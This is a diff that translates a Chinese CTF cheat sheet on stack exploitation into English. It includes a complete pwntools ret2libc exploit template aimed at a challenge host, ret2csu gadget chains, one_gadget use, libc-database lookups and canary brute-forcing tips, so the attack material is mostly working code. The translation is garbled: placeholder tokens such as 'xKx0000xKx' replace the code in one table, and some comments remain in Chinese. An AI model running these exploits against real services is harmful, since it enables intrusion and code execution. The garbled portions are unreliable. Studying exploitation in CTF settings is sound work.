@@ -1,64 +1,64 @@
-# 栈类利用 (Stack Pwn)
+# Stack Class Exploitation (Stack Pwn)
 
-## 触发条件与前置检测
+## Trigger Conditions and Pre-Checks
 
-### checksec 解读
+### checksec Analysis
 
 ```bash
 checksec --file=./vuln
-# 或 pwntools 自带
+# Or comes with pwntools
 python -c "from pwn import *; print(ELF('./vuln'))"
 ```
 
-| 输出字段 | 影响 | 应对 |
+| Output Field | Impact | Response |
 |---------|------|------|
-| `NX disabled` | 栈可执行 | 直接塞 shellcode |
-| `Canary found` | 栈溢出会被检测 | 必须先 leak canary 或绕过 (forked process / 格式化字符串) |
-| `PIE enabled` | .text 基址随机 | 必须 leak 一个代码地址 |
-| `No PIE` | .text 固定 | gadget 地址写死 |
-| `Full RELRO` | got 不可写 | 不能改 got，走 ret2libc / one_gadget |
-| `Partial RELRO` | got 可写 | 可以改 got 表 |
-| `FORTIFY` | 部分 libc 函数被替换为 `_chk` 版本 | `read_chk` 仍然能溢出，`strcpy_chk` 不行 |
+| `NX disabled` | Stack executable | Directly inject shellcode |
+| `Canary found` | Stack overflow will be detected | Must first leak the canary or bypass it (forked process / format string) |
+| `PIE enabled` | .text base address randomization | must leak a code address |
+| `No PIE` | .text fixed | gadget address hard-coded |
+| `Full RELRO` | got is not writable | cannot modify got, use ret2libc / one_gadget |
+| `Partial RELRO` | got writable | can modify got table |
+| `FORTIFY` | Some libc functions are replaced with `_chk` versions | `read_chk` can still overflow, `strcpy_chk` cannot |
 
-### 栈溢出长度精确定位
+### Precise Localization of Stack Overflow Length
 
 ```python
-# pwntools cyclic 模式
+# pwntools cyclic pattern
 from pwn import *
 context.arch = 'amd64'
 
-# 1. 生成 cyclic pattern
+# 1. Generate cyclic pattern
 payload = cyclic(200)
 
-# 2. 喂给程序触发崩溃
+# 2. Feed it to the program to trigger a crash
 p = process('./vuln')
 p.sendline(payload)
 p.wait()
 
-# 3. 从 core dump 读 RSP 上的值
+# 3. Reading the value on RSP from the core dump
 core = p.corefile
 fault = core.fault_addr  # 或 core.rsp 指向的 8 字节
 offset = cyclic_find(fault & 0xffffffff)  # 32-bit 模式
-# 64-bit 用 cyclic_find(p64(fault)[:8])
+# 64-bit using cyclic_find(p64(fault)[:8])
 log.info(f"offset = {offset}")
 ```
 
-### 32 / 64 位 calling convention 速查
+### Quick Reference for 32 / 64-bit Calling Conventions
 
-| 架构 | 参数传递 | 返回 | 备注 |
+| Architecture | Parameter Passing | Return | Remarks |
 |------|---------|------|------|
-| x86 (32-bit) | 栈传参（cdecl: 调用者清栈） | eax | 栈结构：ret_addr, arg1, arg2, ... |
-| x86-64 SysV | rdi, rsi, rdx, rcx, r8, r9, 栈 | rax | rsp 必须 16-byte 对齐到 call 入口 |
-| ARM32 | r0-r3, 栈 | r0 | lr 保存返回地址，bx lr 返回 |
-| ARM64 | x0-x7, 栈 | x0 | 类似 SysV，更严格的对齐 |
+| x86 (32-bit) | Stack passing (cdecl: caller cleans the stack) | eax | Stack structure: ret_addr, arg1, arg2, ... |
+| x86-64 SysV | rdi, rsi, rdx, rcx, r8, r9, stack | rax | rsp must be 16-byte aligned at the call entry |
+| ARM32 | r0-r3, stack | r0 | lr stores return address, bx lr returns |
+| ARM64 | x0-x7, stack | x0 | Similar to SysV, stricter alignment |
 
-## ret2libc 完整 pwntools 模板
+## ret2libc Complete pwntools Template
 
 ```python
 #!/usr/bin/env python3
 from pwn import *
 
-# === 环境配置 ===
+# === Environment Configuration ===
 exe = './vuln'
 libc_path = './libc.so.6'
 HOST, PORT = 'chal.example.com', 31337
@@ -67,7 +67,7 @@ context.binary = elf = ELF(exe)
 context.log_level = 'info'
 libc = ELF(libc_path)
 
-# 自动 patchelf 让本地用题目给的 libc
+# Automatically use patchelf to make the local environment use the libc provided by the problem
 # patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vuln
 
 def conn():
@@ -95,12 +95,12 @@ payload += p64(elf.sym['main'])     # 回到 main，复用栈溢出做第二轮
 
 p.sendlineafter(b'> ', payload)
 
-# 接收 leak（注意 recvuntil 锚字符串，不要用 sleep）
+# Receive leak (pay attention to the recvuntil anchor string, do not use sleep)
 p.recvuntil(b'bye\n')
 leak = u64(p.recvline().strip().ljust(8, b'\x00'))
 log.success(f'leaked puts @ {hex(leak)}')
 
-# 反查 libc base
+# Reverse lookup libc base
 libc.address = leak - libc.sym['puts']
 log.success(f'libc base = {hex(libc.address)}')
 
@@ -119,22 +119,22 @@ p.sendlineafter(b'> ', payload)
 p.interactive()
 ```
 
-### 栈对齐坑（必看）
+### Stack Alignment Pitfalls (Must Read)
 
 ```text
-现象：本地能打通，远程 system 一进去就 SIGSEGV
-原因：libc 的 system → do_system → 内部某处 movaps xmm0, [rsp]
-       要求 rsp 16-byte 对齐
-失败：你的 ROP 链跳进 system 时，rsp 末位是 0x8 而不是 0x0
-修复：在 ROP 链里插一个 `ret` gadget（消耗 8 字节，让 rsp 重新对齐）
+Phenomenon: It works locally, but as soon as the remote system enters, it gets a SIGSEGV
+Reason: libc's system → do_system → somewhere inside movaps xmm0, [rsp]
+Requires rsp to be 16-byte aligned
+Failure: When your ROP chain jumps to system, the last byte of rsp is 0x8 instead of 0x0
+Fix: Insert a `ret` gadget in the ROP chain (consumes 8 bytes, realigns rsp)
 ```
 
-## ret2csu（万能 gadget）
+## ret2csu (universal gadget)
 
-当二进制里没有 `pop rdx; ret` 这种第三参数 gadget 时，用 `__libc_csu_init` 里的固定结构（glibc < 2.34 静态链接的程序里都有）。
+When there is no third-parameter gadget like `pop rdx; ret` in the binary, use the fixed structure in `__libc_csu_init` (which exists in programs statically linked with glibc < 2.34).
 
 ```text
-__libc_csu_init 末尾固定 pattern：
+__libc_csu_init fixed pattern at the end:
     add  rsp, 8
     pop  rbx
     pop  rbp
@@ -144,14 +144,14 @@ __libc_csu_init 末尾固定 pattern：
     pop  r15
     ret
 
-中间还有：
+In the middle there is also:
     mov  rdx, r15  ; r15 → rdx
     mov  rsi, r14  ; r14 → rsi
-    mov  edi, r13d ; r13 → rdi (低 32 位)
+mov  edi, r13d ; r13 → rdi (lower 32 bits)
     call qword ptr [r12 + rbx*8]
 ```
 
-pwntools 写法：
+pwntools syntax:
 
 ```python
 csu_pop = 0x40119a  # 第一段（pop rbx..r15; ret）
@@ -170,14 +170,14 @@ def csu(rdi, rsi, rdx, call_target):
     return p
 ```
 
-适用：bss 里写一个函数指针，再用 csu 调用它，常用于 `read(0, bss, 0x100)` 阶段后跳到 bss 执行 ROP。
+Applicable: Write a function pointer in bss, then use csu to call it. Commonly used to jump to bss and execute ROP after the `read(0, bss, 0x100)` stage.
 
-## one_gadget 用法
+## one_gadget Usage
 
 ```bash
 one_gadget ./libc.so.6
 
-# 输出类似：
+# Output similar to:
 # 0xe3afe execve("/bin/sh", r15, r12)
 # constraints:
 #   [r15] == NULL || r15 == NULL
@@ -194,7 +194,7 @@ one_gadget ./libc.so.6
 #   [rdx] == NULL || rdx == NULL
 ```
 
-使用：
+Usage:
 
 ```python
 og = [0xe3afe, 0xe3b01, 0xe3b04]
@@ -203,76 +203,76 @@ payload += p64(ret)
 payload += p64(libc.address + og[1])  # 挑约束能满足的那个
 ```
 
-**坑**：one_gadget 在某些 libc 版本（2.34+）约束极难满足，老老实实 ret2libc 更稳。
+**Pitfall**: one_gadget is extremely difficult to satisfy in certain libc versions (2.34+); honestly, ret2libc is more stable.
 
-## libc-database 反查
+## libc-database Reverse Lookup
 
-场景：题目没给 libc，只能 leak 几个函数地址反推版本。
+Scenario: The problem doesn't provide libc, so you can only leak a few function addresses to infer the version backwards.
 
 ```bash
 cd ~/tools/libc-database
 
-# 用 leak 出来的 puts 和 read 地址（取后 3 位）反查
+# Use the leaked puts and read addresses (take the last 3 digits) to look up
 ./find puts 0x6f0 read 0xfd
-# 输出：libc6_2.31-0ubuntu9.9_amd64
+# Output: libc6_2.31-0ubuntu9.9_amd64
 
-# 拿对应 libc 的所有符号偏移
+# Get all symbol offsets of the corresponding libc
 ./dump libc6_2.31-0ubuntu9.9_amd64
 
-# 下载实际 libc.so.6 到本地
+# Download the actual libc.so.6 to local
 ls db/libc6_2.31-0ubuntu9.9_amd64.so
 ```
 
-pwntools 集成：
+Pwntools integration:
 
 ```python
-# 在线 libc-database 查询（无需本地）
+# Online libc-database query (no local setup required)
 from pwnlib.libcdb import search_by_symbol_offsets
 libs = search_by_symbol_offsets({'puts': 0x6f0, 'read': 0xfd})
 libc = ELF(libs[0])
 ```
 
-## ROPgadget 速查
+## ROPgadget Quick Reference
 
 ```bash
-# 基础：pop|ret 单 reg
+# Basics: pop|ret single reg
 ROPgadget --binary ./vuln --only "pop|ret"
 
-# 找 syscall
+# Find syscall
 ROPgadget --binary ./vuln | grep ': syscall'
 
-# 找带特定字节
+# Find with specific bytes
 ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep 'pop rdi'
 
-# 找字符串
+# Find string
 ROPgadget --binary ./libc.so.6 --string '/bin/sh'
 
-# 输出 JSON 给程序解析
+# Output JSON for program parsing
 ROPgadget --binary ./vuln --json > gadgets.json
 ```
 
-Ropper 替代（架构支持更广）：
+Ropper alternative (broader architecture support):
 
 ```bash
 ropper --file ./vuln --search "pop rdi; ret"
 ropper --file ./libc.so.6 --search "syscall"
 ```
 
-## 远程稳定化清单
+## Remote Stabilization Checklist
 
-| 问题 | 现象 | 解决 |
+| Problem | Phenomenon | Solution |
 |------|------|------|
-| libc 版本错 | 本地通，远程 SIGSEGV in system | leak 后用 libc-database 反查实际版本 |
-| 栈对齐 | system 立刻段错误 | 加一个 `ret` gadget |
-| 网络延迟 | recv 收到一半 | 用 `recvuntil(b'锚字符串')`，不用 `sleep` |
-| 缓冲 | sendline 发完没反应 | 改 `sendlineafter`，明确等到 prompt 再发 |
-| ASLR 浮动 | 概率成功 | 看是否 byte-level brute（1/16 概率不算稳定） |
-| TCP nagle | 小包合并 | `p.settimeout(2); p.recvall(timeout=2)` 保底 |
+| libc version error | Local connection successful, remote SIGSEGV in system | After leak, use libc-database to reverse check the actual version |
+| Stack alignment | system immediately segmentation fault | add a xKx0000xKx gadget |
+| Network latency | recv received halfway | Use xKx0001xKx, do not use xKx0002xKx |
+| Buffer | sendline no response after sending | Change to xKx0003xKx, wait clearly for the prompt before sending |
+| ASLR randomization | Probability of success | See if byte-level brute force (xKx0004xKx probability is not considered stable) |
+| TCP Nagle | Small packet aggregation | xKx0005xKx minimum guarantee |
 
-## 调试技巧
+## Debugging Tips
 
 ```python
-# pwntools 内嵌 gdb attach
+# pwntools embedded gdb attach
 p = process('./vuln')
 gdb.attach(p, '''
     b *main+0x123
@@ -283,30 +283,30 @@ gdb.attach(p, '''
     end
 ''')
 
-# 一开始就在 gdb 里跑
+# Run in gdb from the start
 p = gdb.debug('./vuln', '''
     set follow-fork-mode child
     b main
 ''')
 ```
 
-GEF/pwndbg 常用命令：
+GEF/pwndbg Common Commands:
 
 ```text
-checksec               # 看保护
-vmmap                  # 内存布局
-telescope $rsp 30      # 栈链路（pwndbg）
-stack 30               # 类似（GEF）
-got                    # GOT 表
+checksec               # Check protections
+vmmap                  # Memory layout
+telescope $rsp 30      # Stack chain (pwndbg)
+stack 30               # similar to (GEF)
+got                    # GOT table
 search-pattern "/bin/sh"
-context                # 自动显示 reg + stack + code（默认开）
-ropgadget              # 内嵌 gadget 搜索
+context                # Automatically display reg + stack + code (on by default)
+ropgadget              # Embedded gadget search
 ```
 
-## 注意事项
+## Notes
 
-- **NX 关 + ASLR 关**才能直接 shellcode；现代二进制基本都开 NX
-- **canary 在 fork 子进程里不变** — forking server 可以一次 byte 一次 byte 爆破（1/256 × 7 字节）
-- **格式化字符串可以同时 leak canary 和 libc** — 用 `%p %p ... %p` 扫栈
-- **DynELF 慢但万能** — 完全没给 libc 时，pwntools 的 `DynELF` 可以纯靠程序自己的 IO 原语逐字节 leak 符号表
-- **静态链接的程序没有 libc.got** — 走 SROP（sigreturn-oriented programming）或直接 syscall
+- **NX off + ASLR off** are required to directly execute shellcode; modern binaries basically all have NX enabled
+- **The canary does not change in forked subprocesses** — the forking server can be brute-forced byte by byte (1/256 × 7 bytes)
+- **Formatted strings can leak both the canary and libc** — use `%p %p ... %p` to scan the stack
+- **DynELF is slow but versatile** — When libc is completely unknown, pwntools' `DynELF` can leak the symbol table byte by byte purely using the program's own IO primitives
+- **Statically linked programs don’t have libc.got** — use SROP (sigreturn-oriented programming) or direct syscalls
